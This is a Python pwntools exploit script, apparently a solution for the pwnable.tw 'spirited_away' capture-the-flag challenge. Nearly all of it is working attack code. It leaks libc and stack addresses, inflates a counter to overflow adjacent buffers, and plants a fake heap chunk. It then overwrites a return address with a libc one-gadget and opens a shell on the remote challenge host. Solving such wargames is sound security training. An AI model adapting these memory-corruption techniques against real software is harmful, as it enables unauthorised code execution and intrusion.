from pwn import *

def name(name):
	p.recvuntil("Please enter your name: ")
	p.send(name)

def age(age):
	p.recvuntil("Please enter your age: ")
	p.sendline(str(age))

def why(why):
	p.recvuntil("Why did you came to see this movie? ")
	p.send(why)

def comment(comment):
	p.recvuntil("Please enter your comment: ")
	p.send(comment)

def show():
	res = dict();
	p.recvuntil("Name: ")
	res['name'] = p.recvuntil("\n")[:-1]
	p.recvuntil("Age: ")
	res['age'] = p.recvuntil("\n")[:-1]
	p.recvuntil("Reason: ")
	res['why'] = p.recvuntil("\n")[:-1]
	p.recvuntil("Comment: ")
	res['comment'] = p.recvuntil("\n")[:-1]
	p.recvuntil("\n")
	return res

def retry(flag):
	p.recvuntil("we can\n")
	p.recvuntil("\n")
	p.recvuntil("Would you like to leave another comment? <y/n>: ")
	p.send(flag)

def send_data(uname, uage, uwhy, ucomment, flag):
	name(uname)
	age(uage)
	why(uwhy)
	comment(ucomment)
	data = show()
	print data
	retry(flag)
	return data

def send_a(uname,uwhy,ucomment,flag):
	name(uname)
	why(uwhy)
	comment(ucomment)
	data = show()
	print data
	retry(flag)
	return data

if __name__ == '__main__':
#p = process("./spirited_away", env={'LD_PRELOAD' : './libc_32.so.6'})
	p = remote("chall.pwnable.tw", 10204)
	libc = ELF("./libc_32.so.6")
	elf = ELF("./spirited_away")

	data = send_data("c2w2m2", 18, "A"*24, "Good", 'y')
	leak = u32(data['why'][24:])
	libc_base = leak - 0x675e7
	print "[Libc] : 0x%x" % libc_base
	
	data = send_data("c2w2m2", 18, "A"*56, "Good", 'y')

	leak = u32(data['why'][56:60])
	ebp = leak - 0x20
	print "[Ebp] : 0x%x" % ebp
	
	for i in range(0,8):
		p.recvuntil("\n")
		send_data("c2w2m2",i,"a\x00","C"*4,'y')
		sleep(0.1)
	for i in range(0,97):
		send_a("c2w2m2","A\x00","C"*4,'y')
	
	fake_addr = ebp - 0x50 + 8

	fake_chunk = p32(0) + p32(0x41)
	fake_chunk += "A"*4 + p32(0) * 14
	fake_chunk += p32(0x409) + p32(0xa31)

	send_a("c2w2m2",fake_chunk + "\x00",'A'*80 + p32(1234578) + p32(fake_addr),'y')	
	send_a("A"*76 + p32(libc_base + 0x3a819), 'a', 'b', 'n')
	p.interactive()
